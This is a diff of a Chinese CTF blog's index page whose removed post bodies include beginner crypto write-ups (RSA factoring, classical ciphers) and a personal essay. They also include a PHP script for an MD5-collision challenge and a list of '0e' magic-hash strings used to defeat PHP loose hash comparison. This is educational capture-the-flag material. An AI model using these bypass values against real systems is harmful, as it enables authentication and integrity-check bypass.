class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function  readmyfile($path)&#123;</span><br><span class="line">    $fh = fopen($path, &quot;rb&quot;);</span><br><span class="line">    $data = fread($fh, filesize($path));</span><br><span class="line">    fclose($fh);</span><br><span class="line">    return $data;</span><br><span class="line">&#125;</span><br><span class="line">echo &apos;二进制hash &apos;. md5( (readmyfile(&quot;jlzj00&quot;)));</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;</span><br><span class="line">echo  &apos;URLENCODE &apos;. urlencode(readmyfile(&quot;jlzj00&quot;));</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;</span><br><span class="line">echo &apos;URLENCODE hash &apos;.md5(urlencode (readmyfile(&quot;jlzj00&quot;)));</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;</span><br><span class="line">echo &apos;二进制hash &apos;.md5( (readmyfile(&quot;jlzj01&quot;)));</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;</span><br><span class="line">echo  &apos;URLENCODE &apos;.  urlencode(readmyfile(&quot;jlzj01&quot;));</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;</span><br><span class="line">echo &apos;URLENCODE hash &apos;.md5( urlencode(readmyfile(&quot;jlzj01&quot;)));</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">echo &apos;二进制hash &apos;. md5( (readmyfile(&quot;jlzj10&quot;)));</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;</span><br><span class="line">echo  &apos;URLENCODE &apos;. urlencode(readmyfile(&quot;jlzj10&quot;));</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;</span><br><span class="line">echo &apos;URLENCODE hash &apos;.md5(urlencode (readmyfile(&quot;jlzj10&quot;)));</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br></pre></td></tr></table></figure></p>
-<p>在这个页面得到生成的三个文件的url编码，之后在bp传参给a、b、c，拿到flag</p>
-<p><del>好像也可以直接用python调用open并读取文件来传参..但咱不会写脚本..</del></p>
-<hr>
-<p>附：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">0e开头的md5和原值：</span><br><span class="line"> </span><br><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure>
-
+        <p>zk九月赛<br>
       
-    </div>
+    </p></div>
     
     <div class="article-info article-info-index">
       
@@ -552,6 +443,10 @@
       
       <div class="clearfix"></div>
     </div>
+      
+        <p class="article-more-link">
+          <a href="/2019/09/27/zk月赛/#more">more >></a>
+        </p>
       
     
   </div>
@@ -594,27 +489,9 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>记一下前天写的一道密码题</p>
-<h1 id="Normal-RSA"><a href="#Normal-RSA" class="headerlink" title="Normal_RSA"></a>Normal_RSA</h1><blockquote>
-<p>你和小鱼走啊走走啊走，走到下一个题目一看你又一愣，怎么还是一个数学题啊 小鱼又一笑，hhhh数学在密码学里面很重要的！现在知道吃亏了吧！你哼一声不服气，我知道数学 很重要了！但是工具也很重要的，你看我拿工具把他解出来！你打开电脑折腾了一会还真的把答案 做了出来，小鱼有些吃惊，向你投过来一个赞叹的目光</p>
-</blockquote>
-<p>主要考察RSAtool的使用，github 下载链接<a href="https://github.com/ius/rsatool" target="_blank" rel="noopener">https://github.com/ius/rsatool</a></p>
-<p>[工具]</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl和rsatool</span><br></pre></td></tr></table></figure>
-<p>openssl在kali虚拟机里有，使用方法参考<a href="https://www.cnblogs.com/yangxiaolan/p/6256838.html" target="_blank" rel="noopener">https://www.cnblogs.com/yangxiaolan/p/6256838.html</a></p>
-<p>这道题给了两个文件，一个是加密过的的flag.enc，另一个是公钥pubkey.pem。<br>先用openssl提取出pubkey.pem中的参数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem</span><br></pre></td></tr></table></figure>
-<p>得到Modulus（16）进制<br><img src="https://s2.ax1x.com/2019/09/26/uukxXV.png" alt="1"><br>把十六进制转化为十进制，转化地址  <a href="https://tool.lu/hexconvert/" target="_blank" rel="noopener">https://tool.lu/hexconvert/</a></p>
-<p>结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">87924348264132406875276140514499937145050893665602592992418171647042491658461</span><br></pre></td></tr></table></figure></p>
-<p>用在线工具分解成两个素数，网址<a href="http://www.factordb.com/index.php?query=87924348264132406875276140514499937145050893665602592992418171647042491658461，得到" target="_blank" rel="noopener">http://www.factordb.com/index.php?query=87924348264132406875276140514499937145050893665602592992418171647042491658461，得到</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">275127860351348928173285174381581152299 </span><br><span class="line">319576316814478949870590164193048041239</span><br></pre></td></tr></table></figure></p>
-<p>知道两个素数，随机定义大素数e,求出密钥文件，命令是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python rsatool.py -o private.pem -e 65537 -p 275127860351348928173285174381581152299 -q 319576316814478949870590164193048041239</span><br></pre></td></tr></table></figure></p>
-<p>然后我就出现了问题在这个地方emmm，可能是我的工具有问题emmmm我要存疑了</p>
-<p>如果没有问题的话正常情况下会生成一个private.pem的文件，最后解密得到flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -in flag.enc -inkey private.pem</span><br></pre></td></tr></table></figure>
-<hr>
-<!--因为今天在跟男朋友生气了，我只要一跟他生气我就什么也干不了，整个人躺在床上像是要行将就木了，所以我必须跟他和好后才更了这么一道题，因为今天也没有别的可更了。。今天没有什么学习上的收获emm，不过今天的溜冰取得了可见的进步hhhh，然后下午看的白蛇缘起太感人了！跟哪吒一样好看呀，等着刷第二遍-->
+        <p>crypto<br>
       
-    </div>
+    </p></div>
     
     <div class="article-info article-info-index">
       
@@ -637,6 +514,10 @@
       
       <div class="clearfix"></div>
     </div>
+      
+        <p class="article-more-link">
+          <a href="/2019/09/26/攻防世界crypto新手wp（2）/#more">more >></a>
+        </p>
       
     
   </div>
@@ -679,7 +560,8 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;每天一篇博客不能断更，那我今天就不写技术文章了，今天想反思一下自己。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;实验室的比赛从昨天到今天，有幸成为第一个解出web题的人，但只开心了一小会就不开心了，不但成就感没有了,也连学习的动力都没有了。因为觉得太难了，差不多写了一天，即使没有一天也实实在在的写了七个小时，觉得太难了，所以不想学了，即使大家都没有写出来我也觉得太难了我没有天赋学这个，即使大家都对这些知识点懵懵懂懂我也觉得太难了我学不会，我应该做些我有天分做好的事情，我甚至开始想如果大家都没有关注pwn、re，如果大家都是web手我还可能先写出来web题吗？我觉得不会，我还觉得我一点天分都没有，可是我的天分在哪呢？<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我好像每做一件事情到了爬坡阶段时都会告诉自己“我一点天分都没有，我不想在这方面努力了”，所以我也没有做好过任何一件事情。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我一想到可能会很难的东西就会害怕，比如学php的时候没敲留言板现在想到留言板就觉得好难我不会，比如学盲注的时候迷茫了太久现在见到sql注入的题就只想放弃，我太害怕去尝试那些未知的而我又觉得难的事物了，又或是已知的我觉得难的事物，比如今天的题即使学长说很简单，我也只要一想到七个小时就觉得好难我不想学了。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所以我每一件事情都能做的不错，却每一件事情都不能做的出色，学习永远中等，永远不用努力就能当上老师口中的聪明学生；字写的永远不错，放在国内却也只算个一般水平；主持节目永远能叫人眼前一亮，比专业的却差了十万八千里；作文永远被当范文，总是被夸是才女，发表的文章却是一篇没有。从来没拔得头筹，却还为不上不下的尴尬境地沾沾自喜，因为觉得好简单啊，不用努力就能做的不错，可我也从来没有意识到，这个思想是对立面竟然是“努力会很难吧，还是放弃好了”。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;遇见不会写的题就觉得学习好难啊，我不适合学习；看见大家的书法就觉得这需要很多功夫吧，我还是慢慢练吧；想成为像董卿那样主持人，要做口腔操和气息训练时又觉得好累呀等以后再练吧； 想好好开发一下自己的写作天赋，但是每天练笔好难啊，以后再说吧；想成为朗朗那样的钢琴家想每天十二个小时练琴，练了两个小时之后：好累呀我什么都不想干了。我哪里是别人口中的多才多艺啊，分明就是个遇见困难就想逃跑的胆小鬼啊。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;胡适说怕什么真理无穷，进一步有一步的欢喜。我没怕真理无穷，我是怕真理太难，进一步需要一步的毅力。真想拿出高中写数学题的精神来，从不把任何难题放在眼里。可嘲讽的是，大学的数学却也让我畏惧，会不会很难？我会不会不适合学数学？之前能学好什么都是因为喜欢老师呀，没有老师我什么也学不好。我一直在这样给自己下定论，可我没有意识到，喜欢老师带给我的是不畏难的勇气，是相信自己一定能做到最好的信心，而离开了老师，我缺少的不是教育，是说服自己坚持学习的动力。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我想努力奔跑，从现在开始，追上那个曾经被寄予厚望的自己。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我要正视自己，不去躲避不去畏惧，怕什么路途险阻，进一步有一步的欢喜。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可能永远都不会拥有“逢山开路，遇水架桥”的决心，但至少回过头来我能说，我或许败北，或许迷失自己，或许哪里也抵达不了，可至少我有值得等待值得追求的东西。</p>
+        <a id="more"></a>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;每天一篇博客不能断更，那我今天就不写技术文章了，今天想反思一下自己。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;实验室的比赛从昨天到今天，有幸成为第一个解出web题的人，但只开心了一小会就不开心了，不但成就感没有了,也连学习的动力都没有了。因为觉得太难了，差不多写了一天，即使没有一天也实实在在的写了七个小时，觉得太难了，所以不想学了，即使大家都没有写出来我也觉得太难了我没有天赋学这个，即使大家都对这些知识点懵懵懂懂我也觉得太难了我学不会，我应该做些我有天分做好的事情，我甚至开始想如果大家都没有关注pwn、re，如果大家都是web手我还可能先写出来web题吗？我觉得不会，我还觉得我一点天分都没有，可是我的天分在哪呢？<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我好像每做一件事情到了爬坡阶段时都会告诉自己“我一点天分都没有，我不想在这方面努力了”，所以我也没有做好过任何一件事情。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我一想到可能会很难的东西就会害怕，比如学php的时候没敲留言板现在想到留言板就觉得好难我不会，比如学盲注的时候迷茫了太久现在见到sql注入的题就只想放弃，我太害怕去尝试那些未知的而我又觉得难的事物了，又或是已知的我觉得难的事物，比如今天的题即使学长说很简单，我也只要一想到七个小时就觉得好难我不想学了。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所以我每一件事情都能做的不错，却每一件事情都不能做的出色，学习永远中等，永远不用努力就能当上老师口中的聪明学生；字写的永远不错，放在国内却也只算个一般水平；主持节目永远能叫人眼前一亮，比专业的却差了十万八千里；作文永远被当范文，总是被夸是才女，发表的文章却是一篇没有。从来没拔得头筹，却还为不上不下的尴尬境地沾沾自喜，因为觉得好简单啊，不用努力就能做的不错，可我也从来没有意识到，这个思想是对立面竟然是“努力会很难吧，还是放弃好了”。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;遇见不会写的题就觉得学习好难啊，我不适合学习；看见大家的书法就觉得这需要很多功夫吧，我还是慢慢练吧；想成为像董卿那样主持人，要做口腔操和气息训练时又觉得好累呀等以后再练吧； 想好好开发一下自己的写作天赋，但是每天练笔好难啊，以后再说吧；想成为朗朗那样的钢琴家想每天十二个小时练琴，练了两个小时之后：好累呀我什么都不想干了。我哪里是别人口中的多才多艺啊，分明就是个遇见困难就想逃跑的胆小鬼啊。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;胡适说怕什么真理无穷，进一步有一步的欢喜。我没怕真理无穷，我是怕真理太难，进一步需要一步的毅力。真想拿出高中写数学题的精神来，从不把任何难题放在眼里。可嘲讽的是，大学的数学却也让我畏惧，会不会很难？我会不会不适合学数学？之前能学好什么都是因为喜欢老师呀，没有老师我什么也学不好。我一直在这样给自己下定论，可我没有意识到，喜欢老师带给我的是不畏难的勇气，是相信自己一定能做到最好的信心，而离开了老师，我缺少的不是教育，是说服自己坚持学习的动力。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我想努力奔跑，从现在开始，追上那个曾经被寄予厚望的自己。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我要正视自己，不去躲避不去畏惧，怕什么路途险阻，进一步有一步的欢喜。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可能永远都不会拥有“逢山开路，遇水架桥”的决心，但至少回过头来我能说，我或许败北，或许迷失自己，或许哪里也抵达不了，可至少我有值得等待值得追求的东西。</p>
 
       
     </div>
@@ -747,29 +629,9 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="转轮机加密"><a href="#转轮机加密" class="headerlink" title="转轮机加密"></a>转轮机加密</h1><blockquote>
-<p>你俩继续往前走，来到了前面的下一个关卡，这个铺面墙上写了好多奇奇怪怪的 英文字母，排列的的整整齐齐，店面前面还有一个大大的类似于土耳其旋转烤肉的架子，上面一圈圈的 也刻着很多英文字母，你是一个小历史迷，对于二战时候的历史刚好特别熟悉，一拍大腿：“嗨呀！我知道 是什么东西了！”。提示：托马斯·杰斐逊</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">文件：</span><br><span class="line">1:  &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;</span><br><span class="line">2:  &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt;</span><br><span class="line">3:  &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;</span><br><span class="line">4:  &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;</span><br><span class="line">5:  &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt;</span><br><span class="line">6:  &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt;</span><br><span class="line">7:  &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt;</span><br><span class="line">8:  &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;</span><br><span class="line">9:  &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt;</span><br><span class="line">10: &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt;</span><br><span class="line">11：&lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt;</span><br><span class="line">12：&lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt;</span><br><span class="line">13：&lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;</span><br><span class="line"></span><br><span class="line">密钥为：2,3,7,5,13,12,9,1,8,10,4,11,6</span><br><span class="line">密文为：NFQKSEVOQOFNP</span><br></pre></td></tr></table></figure>
-<p>把文件重新排序，并把密文转到第一个位置，发现FIREINTHEHOLE<br><img src="https://s2.ax1x.com/2019/09/25/uErBDO.png" alt="1"><br>换成小写得到flag：cyberpeace{fireinthehole}</p>
-<h1 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h1><blockquote>
-<p>解答出来了上一个题目的你现在可是春风得意，你们走向了下一个题目所处的地方 你一看这个题目傻眼了，这明明是一个数学题啊！！！可是你的数学并不好。扭头看向小鱼，小鱼哈哈一笑 ，让你在学校里面不好好听讲现在傻眼了吧~来我来！三下五除二，小鱼便把这个题目轻轻松松的搞定了。flag格式为cyberpeace{小写的你解出的答案}</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">文件：</span><br><span class="line">在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17</span><br><span class="line">求解出d</span><br></pre></td></tr></table></figure>
-<p>其实就是个数学题，不过首先要知道<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">d*e≡1(mod φ(n)),</span><br><span class="line">又p、q为质数，</span><br><span class="line">所以φ(n)=(p-1)*(q-1),</span><br><span class="line">即d*e≡1(mod(p-1)*(q-1)</span><br></pre></td></tr></table></figure></p>
-<p>把e p q的值代入得到d，加上格式即为flag：cyberpeace{125631357777427553}</p>
-<h1 id="不仅仅是Morse"><a href="#不仅仅是Morse" class="headerlink" title="不仅仅是Morse"></a>不仅仅是Morse</h1><blockquote>
-<p>“这个题目和我们刚刚做的那个好像啊但是为什么按照刚刚的方法做出来答案却不对呢” ，你奇怪的问了问小鱼，“可能是因为还有一些奇怪的加密方式在里面吧，我们在仔细观察观察”。两个人 安安静静的坐下来开始思考，很耐心的把自己可以想到的加密方式一种种的过了一遍，十多分钟后两个人 异口同声的说“我想到了！”。一种食物,格式为cyberpeace{小写的你解出的答案}</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">文件：</span><br><span class="line">--/.-/-.--/..--.-/-..././..--.-/..../.-/...-/./..--.-/.-/-./---/-/...././.-./..--.-/-.././-.-./---/-.././..../..../..../..../.-/.-/.-/.-/.-/-.../.-/.-/-.../-.../-.../.-/.-/-.../-.../.-/.-/.-/.-/.-/.-/.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/.-/.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../-.../.-/.-/.-/-.../-.../.-/.-/-.../.-/.-/.-/.-/-.../.-/-.../.-/.-/-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/-.../-.../.-/.-/-.../-.../-.../.-/-.../.-/.-/.-/-.../.-/-.../.-/-.../-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../-.../.-/.-/-.../-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/-.../-.../.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/-.../-.../.-</span><br></pre></td></tr></table></figure>
-<p>进行morse解密，得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">may be have another decodehhhhaaaaabaabbbaabbaaaaaaaabaababaaaaaaabbabaaabbaaabbaabaaaababaabaaabbabaaabaaabaababbaabbbabaaabababbaaabbabaaabaabaabaaaabbabbaabbaabaabaaabaabaabaababaabbabaaaabbabaabba</span><br></pre></td></tr></table></figure></p>
-<p>题目提示了一种食物，结果我就是没想出来…后来才知道是培根..(我太zz了)</p>
-<p><strong>培根密码</strong>所用的密码是一种本质上用二进制数设计的，没有用通常的0和1来表示，而是采用a和b<br>培根密码加密有两种方式</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">方式一：</span><br><span class="line">A aaaaa B aaaab C aaaba D aaabb </span><br><span class="line">E aabaa F aabab G aabba H aabbb </span><br><span class="line">I abaaa J abaab K ababa L ababb </span><br><span class="line">M abbaa N abbab O abbba P abbbb </span><br><span class="line">Q baaaa R baaab T baabb U babaa </span><br><span class="line">V babab W babba X babbb Y bbaaa </span><br><span class="line">Z bbaab  </span><br><span class="line"></span><br><span class="line">方式二： </span><br><span class="line">a AAAAA g AABBA n ABBAA t BAABA </span><br><span class="line">b AAAAB h AABBB o ABBAB u-v BAABB </span><br><span class="line">c AAABA i-j ABAAA p ABBBA w BABAA </span><br><span class="line">d AAABB k ABAAB q ABBBB x BABAB </span><br><span class="line">e AABAA l ABABA r BAAAA y BABBA </span><br><span class="line">f AABAB m ABABB s BAAAB z BABBB</span><br></pre></td></tr></table></figure>
-<p>用在线工具解密(虽然大家都是自己写脚本)得到flag：cyberpeace{attackanddefenceworldisinteresting}</p>
-
+        <p>crypto<br>
       
-    </div>
+    </p></div>
     
     <div class="article-info article-info-index">
       
@@ -792,6 +654,10 @@
       
       <div class="clearfix"></div>
     </div>
+      
+        <p class="article-more-link">
+          <a href="/2019/09/24/攻防世界crypto新手wp（1）/#more">more >></a>
+        </p>
       
     
   </div>
@@ -834,33 +700,9 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h1><blockquote>
-<p>元宵节灯谜是一种古老的传统民间观灯猜谜的习俗。 因为谜语能启迪智慧又饶有兴趣，灯谜增添节日气氛，是一项很有趣的活动。 你也很喜欢这个游戏，这不，今年元宵节，心里有个黑客梦的你，约上你青梅竹马的好伙伴小鱼， 来到了cyberpeace的攻防世界猜谜大会，也想着一展身手。 你们一起来到了小孩子叽叽喳喳吵吵闹闹的地方，你俩抬头一看，上面的大红灯笼上写着一些奇奇怪怪的 字符串，小鱼正纳闷呢，你神秘一笑，我知道这是什么了。</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件Y3liZXJwZWFjZXtXZWxjb21lX3RvX25ld19Xb3JsZCF9</span><br></pre></td></tr></table></figure>
-<p>直接找在线解密网站进行解密得到flag：cyberpeace{Welcome_to_new_World!}</p>
-<h1 id="Caesar"><a href="#Caesar" class="headerlink" title="Caesar"></a>Caesar</h1><blockquote>
-<p>你成功的解出了来了灯谜，小鱼一脸的意想不到“没想到你懂得这么多啊！” 你心里面有点小得意，“那可不是，论学习我没你成绩好轮别的我知道的可不比你少，走我们去看看下一个” 你们继续走，看到前面也是热热闹闹的，同样的大红灯笼高高挂起，旁边呢好多人叽叽喳喳说个不停。你一看 大灯笼，上面还是一对字符，你正冥思苦想呢，小鱼神秘一笑，对你说道，我知道这个的答案是什么了</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件oknqdbqmoq&#123;kag_tmhq_xqmdzqp_omqemd_qzodkbfuaz&#125;</span><br></pre></td></tr></table></figure>
-<p>根据提示知道是凯撒加密，找到在线解密网站，位移为12时得到flag：cyberpeace{you_have_learned_caesar_encryption}</p>
-<h1 id="Morse"><a href="#Morse" class="headerlink" title="Morse"></a>Morse</h1><blockquote>
-<p>小鱼得意的瞟了你一眼，神神气气的拿走了答对谜语的奖励，你心里暗暗较劲 想着下一个谜题一定要比小鱼更快的解出来。不知不觉你们走到了下一个谜题的地方，这个地方有些奇怪。 上面没什么提示信息，只是刻着一些0和1，感觉有着一些奇怪的规律，你觉得有些熟悉，但是就是想不起来 这些01代表着什么意思。一旁的小鱼看你眉头紧锁的样子，扑哧一笑，对你讲“不好意思我又猜到答案了。”(flag格式为cyberpeace{xxxxxxxxxx},均为小写)</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件11 111 010 000 0 1010 111 100 0 00 000 000 111 00 10 1 0 010 0 000 1 00 10 110</span><br></pre></td></tr></table></figure>
-<p>把1转换成-，0转换成.，得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-- --- .-. ... . -.-. --- -.. . .. ... ... --- .. -. - . .-. . ... - .. -. --.</span><br></pre></td></tr></table></figure></p>
